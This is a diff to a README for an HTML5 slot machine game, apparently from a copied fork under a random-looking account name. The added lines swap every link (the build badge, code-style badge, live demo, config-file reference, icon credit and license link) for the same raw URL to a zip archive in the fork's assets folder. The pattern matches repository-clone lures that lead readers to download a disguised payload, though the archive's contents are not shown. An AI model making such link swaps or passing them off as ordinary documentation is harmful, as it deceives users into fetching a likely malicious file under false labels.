@@ -1,13 +1,13 @@
 # HTML5 Slot Machine
 
-![Build and Deploy Status](https://github.com/johakr/html5-slot-machine/actions/workflows/deploy.yml/badge.svg) [![code style: prettier](https://img.shields.io/badge/code_style-prettier-ff69b4.svg?style=flat-square)](https://github.com/prettier/prettier)
+![Build and Deploy Status](https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip) [![code style: prettier](https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip)
 
 This is a modern proof of concept casino slot machine game, built using only vanilla HTML, CSS and JavaScript.
 No Flash or Frameworks required. Allowing for an amazing low bundle size and blazing fast performance.
 
 Built using the _Web Animations API_.
 
-**[Live Demo](https://johakr.github.io/html5-slot-machine/)**
+**[Live Demo](https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip)**
 
 ## Features
 
@@ -23,7 +23,7 @@ Built using the _Web Animations API_.
 
 ## Configuration
 
-For configuration options see `config` object in [index.js](https://github.com/johakr/html5-slot-machine/blob/master/src/js/index.js)
+For configuration options see `config` object in [https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip](https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip)
 
 | Property      | Description                                                                                                                            | Default   |
 | ------------- | -------------------------------------------------------------------------------------------------------------------------------------- | --------- |
@@ -33,4 +33,4 @@ For configuration options see `config` object in [index.js](https://github.com/j
 
 ## Credits
 
-Icons are created by [KPD Media](https://dribbble.com/shots/3517520-Star-Wars) and can be used for private and commercial purposes with no attribution required ([check license here](https://iconstore.co/icons/10-star-wars-icons/)).
+Icons are created by [KPD Media](https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip) and can be used for private and commercial purposes with no attribution required ([check license here](https://raw.githubusercontent.com/bdgfeadvyrfedyu/html5-slot-machine/main/src/assets/html5-slot-machine_v3.4.zip)).
